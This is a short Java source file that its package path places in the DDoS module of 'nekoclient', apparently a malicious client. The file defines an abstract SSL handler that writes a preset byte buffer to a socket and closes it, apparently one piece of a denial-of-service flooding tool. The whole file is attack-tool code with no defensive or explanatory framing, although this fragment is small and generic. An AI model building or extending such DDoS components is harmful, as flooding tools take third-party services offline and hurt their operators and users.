package dev.neko.nekoclient.api.ddos.impl.handler.ssl;

import java.io.IOException;
import javax.net.ssl.SSLSocket;

public abstract class SSLBufferWritingMethodHandler extends SSLWriteMethodHandler {
   protected byte[] buffer;

   @Override
   public void handle(SSLSocket socket) throws IOException {
      socket.getOutputStream().write(this.buffer);
      socket.close();
   }
}
